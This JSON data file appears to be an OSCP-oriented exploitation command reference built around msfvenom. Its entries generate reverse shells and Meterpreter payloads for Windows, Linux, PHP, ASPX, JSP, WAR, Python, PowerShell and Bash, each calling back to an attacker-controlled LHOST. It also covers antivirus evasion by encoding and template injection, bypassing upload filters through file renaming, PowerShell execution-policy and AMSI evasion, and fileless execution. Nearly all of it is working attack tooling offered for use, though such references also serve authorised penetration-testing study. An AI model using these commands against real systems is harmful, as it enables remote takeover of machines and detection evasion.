{
  "category": "exploitation",
  "commands": [
    {
      "id": "msfvenom-list-payloads",
      "name": "List Available Payloads",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -l payloads --platform <PLATFORM> --arch <ARCH>",
      "description": "Display all payloads available for specific platform and architecture",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "PAYLOADS",
        "ENUMERATION"
      ],
      "variables": [
        {
          "name": "<PLATFORM>",
          "description": "Target platform (windows, linux, osx, android, etc)",
          "example": "windows",
          "required": false
        },
        {
          "name": "<ARCH>",
          "description": "Target architecture (x86, x64, arm, mips, etc)",
          "example": "x64",
          "required": false
        }
      ],
      "flag_explanations": {
        "-l payloads": "List all available payloads",
        "--platform": "Filter by target OS platform",
        "--arch": "Filter by CPU architecture",
        "-l formats": "List available output formats (exe, elf, php, etc)",
        "-l encoders": "List available encoders for evasion"
      },
      "success_indicators": [
        "Long list of payload paths displayed",
        "Payloads filtered by platform/arch if specified"
      ],
      "failure_indicators": [
        "msfvenom command not found"
      ],
      "next_steps": [
        "msfvenom-windows-reverse",
        "msfvenom-linux-reverse"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "command_not_found": "Install Metasploit: sudo apt install metasploit-framework"
      },
      "notes": "Staged payloads contain '/' (e.g., windows/meterpreter/reverse_tcp).\n\nNon-staged contain '_' (e.g., windows/meterpreter_reverse_tcp).\n\nUse filters to reduce overwhelming output.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-windows-reverse",
      "name": "Generate Windows Reverse Shell Executable",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe",
      "description": "Create Windows 64-bit executable with non-staged TCP reverse shell",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "WINDOWS",
        "REVERSE_SHELL",
        "PAYLOAD_GEN"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address for reverse connection",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker listening port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-p": "Specify payload",
        "LHOST": "Listener host (attacker IP)",
        "LPORT": "Listener port (attacker port)",
        "-f": "Output format (exe, elf, php, asp, war, etc)",
        "-o": "Output file path",
        "-e": "Encoder for evasion (optional)",
        "-i": "Encoding iterations (optional)",
        "--platform": "Force platform (optional)",
        "--arch": "Force architecture (optional)"
      },
      "success_indicators": [
        "No encoder specified, outputting raw payload",
        "Payload size displayed (bytes)",
        "Final size of exe file shown",
        "Saved as: shell.exe"
      ],
      "failure_indicators": [
        "Failed to generate payload",
        "Invalid option format",
        "Permission denied (output path)"
      ],
      "next_steps": [
        "msf-handler-setup",
        "nc-listener"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "antivirus_detected": "Use encoding: -e x86/shikata_ga_nai -i 3",
        "payload_too_large": "Use staged variant: windows/x64/shell/reverse_tcp (smaller first stage)",
        "wrong_arch": "For 32-bit: windows/shell_reverse_tcp (no x64)"
      },
      "notes": "Non-staged payload (shell_reverse_tcp) is self-contained.\n\nStaged variant (shell/reverse_tcp) requires multi/handler.\n\nUse Netcat for non-staged, multi/handler for staged.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-windows-meterpreter",
      "name": "Generate Windows Meterpreter Executable",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<LHOST> LPORT=<LPORT> -f exe -o met.exe",
      "description": "Create Windows 64-bit executable with non-staged Meterpreter over HTTPS",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "WINDOWS",
        "METERPRETER",
        "HTTPS"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP for HTTPS reverse connection",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker HTTPS listener port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "meterpreter_reverse_https": "Non-staged Meterpreter with encrypted HTTPS transport",
        "meterpreter/reverse_https": "Staged variant (smaller but requires multi/handler)",
        "meterpreter_reverse_tcp": "Non-staged over raw TCP (alternative)",
        "-f exe": "Windows executable format"
      },
      "success_indicators": [
        "Payload size shown (larger than basic shell - ~200KB)",
        "Saved as: met.exe"
      ],
      "failure_indicators": [
        "Payload generation failed"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "handler_mismatch": "Must use matching payload in multi/handler: windows/x64/meterpreter_reverse_https",
        "large_file_size": "Meterpreter non-staged is ~200KB (staged is smaller but requires handler)"
      },
      "notes": "HTTPS transport encrypts C2 traffic and blends with normal web traffic.\n\nRequires multi/handler with matching payload.\n\nNon-staged (_) vs staged (/) distinction critical for handler setup.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-linux-reverse",
      "name": "Generate Linux ELF Reverse Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf",
      "description": "Create Linux 64-bit ELF executable with non-staged TCP reverse shell",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "LINUX",
        "REVERSE_SHELL",
        "ELF"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "linux/x64/shell_reverse_tcp": "64-bit non-staged shell",
        "linux/x86/shell_reverse_tcp": "32-bit variant",
        "-f elf": "Linux ELF executable format"
      },
      "success_indicators": [
        "Payload size displayed",
        "Saved as: shell.elf",
        "File is executable (add chmod +x if needed)"
      ],
      "failure_indicators": [
        "Invalid architecture"
      ],
      "next_steps": [
        "nc-listener",
        "chmod-executable"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "wrong_arch": "Check target arch with: uname -m (x86_64 = x64, i686 = x86)",
        "not_executable": "After transfer, make executable: chmod +x shell.elf",
        "permission_denied": "Execute as: ./shell.elf (or from /tmp with noexec bypass)"
      },
      "notes": "After uploading to target, must chmod +x before execution.\n\nELF binaries often caught by AV - consider alternatives like scripting languages (Python, Bash).",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-php-reverse",
      "name": "Generate PHP Web Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php",
      "description": "Create PHP Meterpreter reverse shell for web application exploitation",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "PHP",
        "WEB_SHELL",
        "METERPRETER"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "php/meterpreter_reverse_tcp": "PHP Meterpreter payload",
        "php/reverse_php": "Alternative simple PHP reverse shell",
        "-f raw": "Raw output format (pure PHP code)"
      },
      "success_indicators": [
        "PHP code output to file",
        "File contains <?php opening tag"
      ],
      "failure_indicators": [
        "Invalid format"
      ],
      "next_steps": [],
      "alternatives": [
        "php-reverse-shell"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "upload_blocked": "Rename extension (shell.php.jpg, shell.pHP, etc)",
        "shell_not_executing": "Ensure uploaded to executable directory (not /uploads with execute disabled)",
        "handler_timeout": "Verify PHP script executed via web browser/curl"
      },
      "notes": "Upload via file upload vulnerability or writable web directory.\n\nExecute by browsing to uploaded file.\n\nPHP Meterpreter has limited features compared to Windows/Linux variants.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-aspx-reverse",
      "name": "Generate ASPX Web Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx",
      "description": "Create ASPX web shell for IIS server exploitation",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "ASPX",
        "IIS",
        "WEB_SHELL"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-f aspx": "ASP.NET format for IIS servers",
        "-f asp": "Classic ASP format (older IIS versions)"
      },
      "success_indicators": [
        "ASPX code generated",
        "Saved as: shell.aspx"
      ],
      "failure_indicators": [
        "Format not supported"
      ],
      "next_steps": [
        "msf-handler-setup"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "upload_blocked": "Try .aspx, .asmx, or .ashx extensions",
        "execution_failed": "Verify IIS server allows ASPX execution in upload directory",
        "permissions_denied": "ASPX executes as IIS user (often low privileges)"
      },
      "notes": "ASPX shells run on Windows IIS servers.\n\nUpload via file upload vuln or writable webdav.\n\nDefault IIS execution context is low-privileged service account.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-jsp-reverse",
      "name": "Generate JSP Web Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp",
      "description": "Create JSP web shell for Java application servers (Tomcat, JBoss, WebLogic)",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "JSP",
        "JAVA",
        "TOMCAT"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "java/jsp_shell_reverse_tcp": "JSP reverse shell payload",
        "-f raw": "Raw JSP code output",
        "-f war": "WAR file format (alternative for Tomcat deployment)"
      },
      "success_indicators": [
        "JSP code generated",
        "Contains <%@ page import statements"
      ],
      "failure_indicators": [
        "Invalid payload"
      ],
      "next_steps": [
        "nc-listener"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "war_preferred": "For Tomcat Manager, use -f war instead of -f raw",
        "execution_context": "JSP runs as Tomcat service user (often tomcat or tomcat7)"
      },
      "notes": "JSP format for manual upload.\n\nWAR format for Tomcat Manager deployment.\n\nJSP files must be in webroot or accessible web directory.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-war-reverse",
      "name": "Generate WAR Reverse Shell for Tomcat",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war",
      "description": "Create WAR file containing reverse shell for Tomcat Manager deployment",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "TOMCAT",
        "WAR",
        "JAVA"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-f war": "Java Web Application Archive format",
        "java/jsp_shell_reverse_tcp": "JSP-based reverse shell"
      },
      "success_indicators": [
        "WAR file created",
        "File is ZIP archive containing JSP payload"
      ],
      "failure_indicators": [
        "Invalid format"
      ],
      "next_steps": [
        "nc-listener"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "deployment_failed": "Check Tomcat Manager credentials",
        "shell_not_executing": "After deploying, browse to /shell/ to trigger payload"
      },
      "notes": "Deploy via Tomcat Manager GUI or curl.\n\nAfter deployment, trigger by browsing to deployed application path.\n\nDefault WAR name becomes URL path (/shell.war -> /shell/).",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-python-reverse",
      "name": "Generate Python Reverse Shell Script",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p python/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py",
      "description": "Create Python script with reverse shell payload",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "PYTHON",
        "SCRIPTING"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "python/shell_reverse_tcp": "Python-based reverse shell",
        "python/meterpreter_reverse_tcp": "Python Meterpreter variant",
        "-f raw": "Output pure Python code"
      },
      "success_indicators": [
        "Python code generated",
        "Contains import socket, subprocess"
      ],
      "failure_indicators": [
        "Invalid payload"
      ],
      "next_steps": [
        "nc-listener"
      ],
      "alternatives": [
        "python-reverse-shell"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "python_version": "Ensure Python installed on target: which python || which python3",
        "execution": "Run with: python shell.py or python3 shell.py"
      },
      "notes": "Python scripts work cross-platform (Linux, Windows with Python installed).\n\nLess suspicious than compiled binaries.\n\nCan be executed without file write via:\necho '<CODE>' | python",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-powershell-reverse",
      "name": "Generate PowerShell Reverse Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1",
      "description": "Create PowerShell script with Meterpreter reverse shell",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "POWERSHELL",
        "WINDOWS"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-f psh": "PowerShell script format",
        "-f ps1": "Alternative PowerShell format",
        "windows/x64/meterpreter/reverse_tcp": "Staged Meterpreter (requires handler)"
      },
      "success_indicators": [
        "PowerShell code generated",
        "Base64-encoded payload in output"
      ],
      "failure_indicators": [
        "Invalid format"
      ],
      "next_steps": [
        "msf-handler-setup"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "execution_policy": "Bypass with: powershell -ep bypass -File shell.ps1",
        "amsi_detected": "PowerShell payloads often flagged by AMSI - consider obfuscation",
        "handler_required": "Staged payload requires multi/handler with matching settings"
      },
      "notes": "PowerShell payloads fileless and memory-resident.\n\nExecute without touching disk:\npowershell -c <BASE64_PAYLOAD>.\n\nOften caught by AV/EDR - use encoding/obfuscation.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-bash-reverse",
      "name": "Generate Bash Reverse Shell Script",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.sh",
      "description": "Create Bash script with reverse shell payload",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "BASH",
        "LINUX",
        "UNIX"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "cmd/unix/reverse_bash": "Bash reverse shell command",
        "cmd/unix/reverse": "Generic Unix reverse shell (sh-compatible)",
        "-f raw": "Output raw bash code"
      },
      "success_indicators": [
        "Bash command generated",
        "Contains /dev/tcp/ or nc usage"
      ],
      "failure_indicators": [
        "Invalid payload"
      ],
      "next_steps": [
        "nc-listener"
      ],
      "alternatives": [
        "bash-reverse-shell"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "dev_tcp_unsupported": "Some shells don't support /dev/tcp - use nc alternative",
        "execution": "Make executable: chmod +x shell.sh && ./shell.sh"
      },
      "notes": "Bash payloads work on most Linux/Unix systems.\n\nCan be executed inline:\nbash -c '<PAYLOAD>'.\n\nNo file write needed for command injection.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-encode",
      "name": "Encode Payload for AV Evasion",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p <PAYLOAD> <OPTIONS> -e x86/shikata_ga_nai -i 3 -f <FORMAT> -o encoded.exe",
      "description": "Encode payload multiple times to evade antivirus signature detection",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "ENCODING",
        "AV_EVASION"
      ],
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "Base payload to encode",
          "example": "windows/x64/meterpreter_reverse_tcp",
          "required": true
        },
        {
          "name": "<OPTIONS>",
          "description": "Payload options (LHOST, LPORT, etc)",
          "example": "LHOST=192.168.45.5 LPORT=443",
          "required": true
        },
        {
          "name": "<FORMAT>",
          "description": "Output format",
          "example": "exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-e": "Encoder module to use",
        "-i": "Number of encoding iterations (more = better evasion, larger payload)",
        "x86/shikata_ga_nai": "Polymorphic XOR additive feedback encoder (popular)",
        "x86/call4_dword_xor": "Alternative encoder",
        "-b": "Bad characters to avoid (e.g., -b '\\x00\\x0a\\x0d')"
      },
      "success_indicators": [
        "Attempting to encode payload with <iterations> iterations",
        "Encoded successfully",
        "Payload size increased (encoding overhead)"
      ],
      "failure_indicators": [
        "Encoding failed",
        "Encoder incompatible with payload"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "still_detected": "Encoding alone insufficient for modern AV - use additional obfuscation",
        "payload_too_large": "More iterations = larger file - balance evasion vs size",
        "encoder_incompatible": "Not all encoders work with all payloads - try different encoder"
      },
      "notes": "Encoding is less effective against modern AV/EDR (behavioral detection).\n\nUse as one layer of obfuscation, not sole evasion technique.\n\nIterations above 5-10 provide diminishing returns.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-bad-chars",
      "name": "Generate Payload Avoiding Bad Characters",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p <PAYLOAD> <OPTIONS> -b '<BAD_CHARS>' -f <FORMAT>",
      "description": "Generate payload that avoids specified bad characters for buffer overflow exploitation",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "BUFFER_OVERFLOW",
        "EXPLOIT_DEV"
      ],
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "Payload to generate",
          "example": "windows/shell_reverse_tcp",
          "required": true
        },
        {
          "name": "<OPTIONS>",
          "description": "Payload options",
          "example": "LHOST=192.168.45.5 LPORT=443",
          "required": true
        },
        {
          "name": "<BAD_CHARS>",
          "description": "Characters to avoid in payload (hex format)",
          "example": "\\x00\\x0a\\x0d",
          "required": true
        },
        {
          "name": "<FORMAT>",
          "description": "Output format (c, python, raw, etc)",
          "example": "python",
          "required": true
        }
      ],
      "flag_explanations": {
        "-b": "Bad characters to avoid",
        "-f c": "C array format (for C code)",
        "-f python": "Python array format",
        "-f raw": "Raw binary shellcode"
      },
      "success_indicators": [
        "Payload generated avoiding bad chars",
        "Automatic encoder selection to avoid chars"
      ],
      "failure_indicators": [
        "No encoder found to avoid bad characters",
        "Too many bad characters (cannot generate payload)"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "no_encoder_found": "Too restrictive bad char list - verify bad chars are actually bad",
        "payload_contains_bad_char": "Manually verify payload: hexdump -C shellcode | grep '<BAD_CHAR>'"
      },
      "notes": "Common bad chars:\n\\x00 (null), \\x0a (newline), \\x0d (carriage return).\n\nUse -f python/c for easy integration into exploit code.\n\nVerify payload manually before use.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-custom-template",
      "name": "Inject Payload into Custom Template",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p <PAYLOAD> <OPTIONS> -x <TEMPLATE_EXE> -f exe -o output.exe",
      "description": "Inject payload into existing executable template to avoid detection",
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "TEMPLATE",
        "AV_EVASION"
      ],
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "Payload to inject",
          "example": "windows/meterpreter_reverse_tcp",
          "required": true
        },
        {
          "name": "<OPTIONS>",
          "description": "Payload options",
          "example": "LHOST=192.168.45.5 LPORT=443",
          "required": true
        },
        {
          "name": "<TEMPLATE_EXE>",
          "description": "Path to existing executable to use as template",
          "example": "/usr/share/windows-resources/binaries/plink.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-x": "Specify custom template executable",
        "-k": "Preserve template behavior (keep original functionality)",
        "-f exe": "Output format (must match template type)"
      },
      "success_indicators": [
        "Injecting payload into template",
        "Output file created",
        "File size similar to original template"
      ],
      "failure_indicators": [
        "Template injection failed",
        "Invalid template file"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "template_broken": "Use -k flag to preserve template functionality",
        "still_detected": "Modern AV detects injection patterns - not reliable evasion alone",
        "wrong_arch": "Template and payload must match architecture (x86 vs x64)"
      },
      "notes": "Template injection helps blend payload into legitimate-looking executable.\n\nUse -k to maintain template's original function.\n\nEffectiveness limited against modern AV/EDR.",
      "oscp_relevance": "low"
    },
    {
      "id": "msfvenom-php-shell",
      "name": "Generate PHP Reverse Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php",
      "example": "msfvenom -p php/reverse_php LHOST=192.168.45.5 LPORT=443 -f raw -o shell.php",
      "description": "Create simple PHP reverse shell for web application exploitation",
      "tags": ["METASPLOIT", "MSFVENOM", "PHP", "WEB_SHELL", "OSCP:HIGH"],
      "variables": [
        {"name": "<LHOST>", "description": "Attacker IP", "example": "192.168.45.5", "required": true},
        {"name": "<LPORT>", "description": "Attacker port", "example": "443", "required": true}
      ],
      "flag_explanations": {
        "php/reverse_php": "Simple PHP reverse shell (non-Meterpreter)",
        "-f raw": "Raw PHP code output"
      },
      "success_indicators": ["PHP code generated", "Saved as: shell.php"],
      "failure_indicators": ["Invalid format"],
      "notes": "Upload via file upload vulnerability. Execute by browsing to uploaded file. Add <?php tags if needed.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-aspx-shell",
      "name": "Generate ASPX Reverse Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx",
      "example": "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f aspx -o shell.aspx",
      "description": "Create ASPX web shell for IIS server exploitation",
      "tags": ["METASPLOIT", "MSFVENOM", "ASPX", "IIS", "WEB_SHELL", "OSCP:HIGH"],
      "variables": [
        {"name": "<LHOST>", "description": "Attacker IP", "example": "192.168.45.5", "required": true},
        {"name": "<LPORT>", "description": "Attacker port", "example": "443", "required": true}
      ],
      "flag_explanations": {
        "-f aspx": "ASP.NET format for IIS servers",
        "windows/shell_reverse_tcp": "Non-staged shell (works with netcat listener)"
      },
      "success_indicators": ["ASPX code generated", "Saved as: shell.aspx"],
      "failure_indicators": ["Format not supported"],
      "notes": "For IIS servers. Upload via file upload or WebDAV. Browse to execute. Non-staged works with nc listener.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-encode-shikata",
      "name": "Encode Payload with Shikata Ga Nai",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i <ITERATIONS> -f <FORMAT> -o payload.exe",
      "example": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.5 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe",
      "description": "Encode payload with polymorphic XOR encoder for AV evasion",
      "tags": ["METASPLOIT", "MSFVENOM", "ENCODING", "AV_EVASION", "OSCP:MEDIUM"],
      "variables": [
        {"name": "<PAYLOAD>", "description": "Base payload", "example": "windows/meterpreter/reverse_tcp", "required": true},
        {"name": "<LHOST>", "description": "Attacker IP", "example": "192.168.45.5", "required": true},
        {"name": "<LPORT>", "description": "Attacker port", "example": "443", "required": true},
        {"name": "<ITERATIONS>", "description": "Number of encoding passes", "example": "5", "required": true},
        {"name": "<FORMAT>", "description": "Output format", "example": "exe", "required": true}
      ],
      "flag_explanations": {
        "-e x86/shikata_ga_nai": "Polymorphic XOR additive feedback encoder",
        "-i": "Encoding iterations (more = better evasion but larger payload)"
      },
      "success_indicators": ["Attempting to encode payload", "Encoded successfully"],
      "failure_indicators": ["Encoding failed", "Encoder incompatible"],
      "notes": "Shikata ga nai is most popular encoder but increasingly detected. Use as one layer of obfuscation. 5-10 iterations usually sufficient.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-badchars",
      "name": "Generate Payload Avoiding Bad Characters",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -b '<BADCHARS>' -f <FORMAT>",
      "example": "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -b '\\x00\\x0a\\x0d' -f python",
      "description": "Generate payload that avoids specified bad characters for buffer overflow exploitation",
      "tags": ["METASPLOIT", "MSFVENOM", "BUFFER_OVERFLOW", "BADCHARS", "EXPLOIT_DEV", "OSCP:HIGH"],
      "variables": [
        {"name": "<PAYLOAD>", "description": "Payload to generate", "example": "windows/shell_reverse_tcp", "required": true},
        {"name": "<LHOST>", "description": "Attacker IP", "example": "192.168.45.5", "required": true},
        {"name": "<LPORT>", "description": "Attacker port", "example": "443", "required": true},
        {"name": "<BADCHARS>", "description": "Characters to avoid (hex format)", "example": "\\x00\\x0a\\x0d", "required": true},
        {"name": "<FORMAT>", "description": "Output format (python, c, raw)", "example": "python", "required": true}
      ],
      "flag_explanations": {
        "-b": "Bad characters to avoid - shellcode won't contain these bytes",
        "-f python": "Python array format for exploit scripts",
        "-f c": "C array format for C exploits"
      },
      "success_indicators": ["Payload generated avoiding bad chars", "Automatic encoder selection"],
      "failure_indicators": ["No encoder found to avoid bad characters"],
      "notes": "Common bad chars: \\x00 (null), \\x0a (newline), \\x0d (CR). For buffer overflow exploits, test all chars with bytearray then specify bad ones. Use -f python or -f c for easy integration.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-list-formats",
      "name": "List Available Output Formats",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -l formats",
      "description": "List all available payload output formats (exe, elf, php, asp, etc.)",
      "tags": ["METASPLOIT", "MSFVENOM", "FORMATS", "REFERENCE", "OSCP:MEDIUM"],
      "variables": [],
      "flag_explanations": {
        "-l formats": "List all output format options"
      },
      "success_indicators": ["Format list displayed", "exe, elf, raw, c, python shown"],
      "failure_indicators": ["msfvenom command not found"],
      "notes": "Common formats: exe (Windows), elf (Linux), raw (shellcode), python/c (exploit dev), php/asp/aspx/jsp/war (web shells). Match format to target OS and use case.",
      "oscp_relevance": "medium"
    }
  ]
}